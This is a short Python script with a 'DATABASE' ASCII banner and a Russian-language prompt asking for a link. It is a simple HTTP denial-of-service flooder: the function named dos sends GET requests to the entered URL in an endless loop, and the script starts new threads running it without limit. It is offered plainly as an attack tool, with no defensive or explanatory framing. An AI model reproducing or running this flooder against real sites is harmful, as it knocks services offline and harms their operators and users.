import threading
import requests
import os 

COLOR_CODE = {
    "BLUE": "\033[34m",
    "RESET": "\033[0m",
}
os.system("cls")
print(f'''{COLOR_CODE["BLUE"]}                                
                                                                                 
                                                                                 
                                                                                     
                                                                                     
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─████████████───██████████████─██████████████─██████████████─██████████████───██████████████─██████████████─██████████████─
─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░████░░░░██─██░░██████░░██─██████░░██████─██░░██████░░██─██░░██████░░██───██░░██████░░██─██░░██████████─██░░██████████─
─██░░██──██░░██─██░░██──██░░██─────██░░██─────██░░██──██░░██─██░░██──██░░██───██░░██──██░░██─██░░██─────────██░░██─────────
─██░░██──██░░██─██░░██████░░██─────██░░██─────██░░██████░░██─██░░██████░░████─██░░██████░░██─██░░██████████─██░░██████████─
─██░░██──██░░██─██░░░░░░░░░░██─────██░░██─────██░░░░░░░░░░██─██░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██──██░░██─██░░██████░░██─────██░░██─────██░░██████░░██─██░░████████░░██─██░░██████░░██─██████████░░██─██░░██████████─
─██░░██──██░░██─██░░██──██░░██─────██░░██─────██░░██──██░░██─██░░██────██░░██─██░░██──██░░██─────────██░░██─██░░██─────────
─██░░████░░░░██─██░░██──██░░██─────██░░██─────██░░██──██░░██─██░░████████░░██─██░░██──██░░██─██████████░░██─██░░██████████─
─██░░░░░░░░████─██░░██──██░░██─────██░░██─────██░░██──██░░██─██░░░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─████████████───██████──██████─────██████─────██████──██████─████████████████─██████──██████─██████████████─██████████████─
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────         
                                                                                                                            
                                                                                         
      ''')  
link = input(f'{COLOR_CODE["BLUE"]}[$] Введите ссылку: ')
def dos():
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()